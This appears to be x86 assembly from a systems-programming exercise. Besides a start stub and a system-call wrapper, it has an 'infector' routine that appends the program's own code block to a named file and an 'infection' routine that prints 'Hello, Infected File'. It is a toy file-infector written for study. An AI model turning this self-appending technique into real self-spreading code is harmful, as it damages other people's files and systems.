
section .rodata
section .text
global _start
global code_start
global code_end
global system_call
global infection
global infector
extern main
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:


infection: 
    push    ebp             ; Save caller state
    mov     ebp, esp
    pushad                  ; Save some more caller state
    mov     esi, [ebp+8]    ; save the argument
    jz      end_while
while_:
    mov     edx, 21         ; string size
    mov     ecx, message    ; string pointer
    mov     ebx, 1          ; SDTOUT
    mov     eax, 4          ; SYS_WRITE
    int     0x80            ; system_call
    dec     esi
    jz      end_while
    jmp     while_
end_while:
    popad                   ; Restore caller state (registers)
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller
    message: db "Hello, Infected File", 10, 0	; message

infector: 
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    ; open file
    mov     eax,5           ; SYS_OPEN
    mov     ebx, [ebp+8]    ; file name - argument 1 
    mov     ecx, 1 | 1024   ; O_APPEND
    mov     edx, 0777       ; set mode
    int     0x80            ; system_call
    mov     [ebp-4], eax    ; Save fd

    ; write into the end of the file

    mov     eax, 4          ; SYS_WRITE 
    mov     ebx,[ebp-4]     ; fd
    mov     ecx, code_start
    mov     edx, code_end
    sub     edx, ecx        ; length of code
    int     0x80            ; system_call

    ; closing the file

    mov     eax, 6          ; SYS_CLOSE
    mov     ebx,[ebp-4]     ; fd
    mov     ecx,0
    mov     edx,0
    int     0x80            ; system_call

    popad                   ; Restore caller state (registers)
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_end: